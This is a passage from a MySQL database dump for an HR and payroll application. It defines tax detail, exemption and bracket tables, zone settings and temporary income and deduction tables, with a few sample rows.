  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `otherDependent` varchar(50) DEFAULT NULL,
  `dRelationship` varchar(15) DEFAULT NULL,
  `dBirthDate` date DEFAULT NULL,
  `pTin` varchar(20) DEFAULT NULL,
  `pAddress` text NOT NULL,
  `pEmployer` varchar(50) DEFAULT NULL,
  `pZipCode` varchar(6) DEFAULT NULL,
  `pTin1` varchar(20) DEFAULT NULL,
  `pAddress1` text NOT NULL,
  `pEmployer1` varchar(50) DEFAULT NULL,
  `pZipCode1` varchar(6) DEFAULT NULL,
  `pTin2` varchar(20) DEFAULT NULL,
  `pAddress2` text DEFAULT NULL,
  `pEmployer2` varchar(50) NOT NULL DEFAULT '',
  `pZipCode2` varchar(6) NOT NULL DEFAULT '',
  `pTaxComp` decimal(10,2) NOT NULL DEFAULT 0.00,
  `pTaxWheld` decimal(10,2) NOT NULL DEFAULT 0.00
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tbltaxdetails` (`empNumber`, `otherDependent`, `dRelationship`, `dBirthDate`, `pTin`, `pAddress`, `pEmployer`, `pZipCode`, `pTin1`, `pAddress1`, `pEmployer1`, `pZipCode1`, `pTin2`, `pAddress2`, `pEmployer2`, `pZipCode2`, `pTaxComp`, `pTaxWheld`) VALUES ('0013-CO0-2015', '', '', '2016-03-28', '', '', '', '', '', '', '', '', '', '', '', '', '0.00', '0.00');


#
# TABLE STRUCTURE FOR: tbltaxexempt
#

DROP TABLE IF EXISTS `tbltaxexempt`;

CREATE TABLE `tbltaxexempt` (
  `taxStatus` varchar(20) NOT NULL DEFAULT '',
  `exemptAmount` float(10,2) NOT NULL DEFAULT 0.00,
  PRIMARY KEY (`taxStatus`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tbltaxexempt` (`taxStatus`, `exemptAmount`) VALUES ('Married', '50000.00');
INSERT INTO `tbltaxexempt` (`taxStatus`, `exemptAmount`) VALUES ('Head', '50000.00');
INSERT INTO `tbltaxexempt` (`taxStatus`, `exemptAmount`) VALUES ('Single', '50000.00');


#
# TABLE STRUCTURE FOR: tbltaxrange
#

DROP TABLE IF EXISTS `tbltaxrange`;

CREATE TABLE `tbltaxrange` (
  `taxableFrom` decimal(10,2) NOT NULL DEFAULT 0.00,
  `taxableTo` decimal(10,2) NOT NULL DEFAULT 0.00,
  `taxFactor` decimal(10,2) NOT NULL DEFAULT 0.00,
  `taxBase` decimal(10,2) NOT NULL DEFAULT 0.00,
  `taxDeduct` decimal(10,2) NOT NULL DEFAULT 0.00,
  `orderNumber` int(11) NOT NULL DEFAULT 0
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tbltaxrange` (`taxableFrom`, `taxableTo`, `taxFactor`, `taxBase`, `taxDeduct`, `orderNumber`) VALUES ('140000.00', '250000.00', '0.25', '140000.00', '22500.00', '4');
INSERT INTO `tbltaxrange` (`taxableFrom`, `taxableTo`, `taxFactor`, `taxBase`, `taxDeduct`, `orderNumber`) VALUES ('500000.00', '2000000.00', '0.32', '500000.00', '125000.00', '6');
INSERT INTO `tbltaxrange` (`taxableFrom`, `taxableTo`, `taxFactor`, `taxBase`, `taxDeduct`, `orderNumber`) VALUES ('250000.00', '500000.00', '0.30', '250000.00', '50000.00', '5');
INSERT INTO `tbltaxrange` (`taxableFrom`, `taxableTo`, `taxFactor`, `taxBase`, `taxDeduct`, `orderNumber`) VALUES ('70000.00', '140000.00', '0.20', '70000.00', '8500.00', '3');
INSERT INTO `tbltaxrange` (`taxableFrom`, `taxableTo`, `taxFactor`, `taxBase`, `taxDeduct`, `orderNumber`) VALUES ('10000.00', '30000.00', '0.10', '10000.00', '500.00', '1');
INSERT INTO `tbltaxrange` (`taxableFrom`, `taxableTo`, `taxFactor`, `taxBase`, `taxDeduct`, `orderNumber`) VALUES ('30000.00', '70000.00', '0.15', '30000.00', '2500.00', '2');


#
# TABLE STRUCTURE FOR: tbltempnotification
#

DROP TABLE IF EXISTS `tbltempnotification`;

CREATE TABLE `tbltempnotification` (
  `tmpDate` date NOT NULL DEFAULT '0000-00-00',
  `tmpStepIncrement` int(11) NOT NULL DEFAULT 0,
  `tmpBirthday` int(11) NOT NULL DEFAULT 0,
  `tmpEmployeesMovement` int(11) NOT NULL DEFAULT 0,
  `tmpVacantPosition` int(11) NOT NULL DEFAULT 0,
  `tmpRetiree` int(11) NOT NULL DEFAULT 0
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblworkzone
#

DROP TABLE IF EXISTS `tblworkzone`;

CREATE TABLE `tblworkzone` (
  `currentWorkZone` varchar(20) DEFAULT NULL,
  `currentchiefworkzone` varchar(20) NOT NULL DEFAULT ''
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COMMENT='stores the current working zone. 201 display depend on which';

INSERT INTO `tblworkzone` (`currentWorkZone`, `currentchiefworkzone`) VALUES ('Home', 'Laptop');


#
# TABLE STRUCTURE FOR: tblzone
#

DROP TABLE IF EXISTS `tblzone`;

CREATE TABLE `tblzone` (
  `zonecode` varchar(20) NOT NULL DEFAULT '',
  `zonedesc` varchar(255) NOT NULL DEFAULT '',
  `serverName` varchar(30) NOT NULL DEFAULT '',
  `username` varchar(30) NOT NULL DEFAULT '',
  `password` varchar(30) NOT NULL DEFAULT '',
  `databaseName` varchar(30) NOT NULL DEFAULT ''
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tblzone` (`zonecode`, `zonedesc`, `serverName`, `username`, `password`, `databaseName`) VALUES ('Z1', 'Zone 1', '', '', '', '');


#
# TABLE STRUCTURE FOR: tempempdeduct
#

DROP TABLE IF EXISTS `tempempdeduct`;

CREATE TABLE `tempempdeduct` (
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `deductionCode` varchar(20) NOT NULL DEFAULT '',
  `deductionDesc` varchar(30) NOT NULL DEFAULT '',
  `deductAmount` decimal(10,2) NOT NULL DEFAULT 0.00
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tempempincome
#

DROP TABLE IF EXISTS `tempempincome`;

CREATE TABLE `tempempincome` (
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `incomeCode` varchar(20) NOT NULL DEFAULT '',
  `incomeDesc` varchar(30) NOT NULL DEFAULT '',
  `incomeAmount` decimal(10,2) NOT NULL DEFAULT 0.00
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

